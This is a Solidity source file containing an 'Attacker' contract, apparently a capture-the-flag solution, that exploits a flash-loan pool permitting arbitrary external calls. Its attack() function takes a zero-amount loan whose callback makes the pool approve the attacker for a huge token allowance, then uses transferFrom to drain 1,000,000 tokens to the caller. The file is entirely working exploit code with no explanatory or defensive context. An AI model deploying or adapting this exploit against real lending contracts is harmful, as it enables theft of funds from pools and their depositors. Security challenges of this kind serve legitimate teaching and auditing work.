// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface iLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
}

contract Attacker {
    address private immutable lenderPool;
    address private immutable token;

    constructor(address pool, address tokenAddr) {
        lenderPool = pool;
        token = tokenAddr;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",  address(this), 10000000 ether);
        iLenderPool(lenderPool).flashLoan(0, address(this), token, data);
        IERC20(token).transferFrom(lenderPool, msg.sender, 1000000 ether);
    }
}